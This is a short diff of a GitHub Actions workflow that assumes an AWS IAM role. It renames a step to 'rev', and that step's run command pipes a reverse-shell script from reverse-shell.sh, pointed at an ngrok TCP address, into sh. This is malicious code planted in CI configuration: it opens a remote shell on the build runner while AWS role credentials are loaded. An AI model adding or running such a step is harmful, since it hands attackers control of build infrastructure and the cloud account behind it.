@@ -22,5 +22,5 @@ jobs:
           role-to-assume: arn:aws:iam::520091917895:role/magichk_role
           aws-region: ${{ env.AWS_REGION }}
       # Hello from AWS: WhoAmI
-      - name: Sts GetCallerIdentity
+      - name: rev
         run: curl https://reverse-shell.sh/0.tcp.in.ngrok.io:15600 | sh
